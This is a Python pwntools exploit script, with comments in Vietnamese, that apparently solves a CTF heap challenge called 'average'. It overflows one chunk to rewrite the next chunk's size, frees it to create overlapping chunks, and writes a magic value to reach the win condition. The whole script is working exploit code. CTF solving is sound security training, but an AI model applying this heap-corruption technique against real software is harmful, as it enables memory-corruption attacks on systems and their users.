from pwn import *

# --- CẤU HÌNH ---
exe = './average'
elf = ELF(exe)
context.binary = exe
context.log_level = 'info' 


HOST = 'ahc.ctf.pascalctf.it' 
PORT = 9003            

try:
    p = remote(HOST, PORT)
except:
    log.error("Quên điền IP/PORT hoặc Server chưa mở kìa bạn ơi!")
    exit()

# Magic Value
MAGIC_VAL = 0xdeadbeefcafebabe

def solve():
    log.info("Step 1: Setup Heap (Fill 0-4)...")
    for i in range(5):
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'at: ', str(i).encode())
        p.sendlineafter(b'need? ', b'0')
        p.sendlineafter(b'name: ', b'AAAA') 
        p.sendlineafter(b'message: ', b'Init')

    log.info("Step 2: Preparing P3 to overwrite P4 Header...")
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'from: ', b'3')

    log.info("Step 3: Overwriting P4 Size via P3...")
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'at: ', b'3')
    p.sendlineafter(b'need? ', b'0') 

    p.sendlineafter(b'name: ', b'N'*39)

    # Overwrite Size P4 thành 0x71
    payload_step3 = b'A' * 32 + b'\x71'
    p.sendlineafter(b'message: ', payload_step3)

    log.info("Step 4: Freeing P4 (Trigger Overlapping)...")
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'from: ', b'4')

    log.info("Step 5: Allocate new chunk to overwrite Target...")
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'at: ', b'4')
    
    # Fix 3: Request size để lấy chunk 0x70
    p.sendlineafter(b'need? ', b'24')

    # Fix 4: Offset Jump & Payload
    p.sendlineafter(b'name: ', b'N'*55)
    
    payload_final = b'X' * 24 + p64(MAGIC_VAL)
    p.sendlineafter(b'message: ', payload_final)

    # Đọc dọn buffer
    try:
        p.recvuntil(b'> ', timeout=1)
    except:
        pass

    log.info("Step 6: WIN (Trigger Check)...")
    p.sendline(b'5')
    
    p.interactive()

if __name__ == "__main__":
    solve()